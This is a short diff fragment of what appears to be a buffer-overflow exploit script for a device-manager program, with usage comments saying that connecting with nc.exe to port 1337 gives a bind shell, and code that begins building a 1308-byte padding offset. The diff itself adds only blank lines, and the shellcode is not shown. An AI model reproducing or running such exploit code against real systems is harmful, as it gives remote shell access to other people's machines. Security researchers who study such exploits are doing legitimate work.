@@ -22,6 +22,8 @@ https://www.maxiguvenlik.com/uploads/importfiles/General_DeviceManager.zip
 # 6.- nc.exe local IP Port 1337 and you will have a bind shell
 # 7.- R.I.P. Condor <3
 
+
+
 import struct
 
 offset = b"A" * 1308
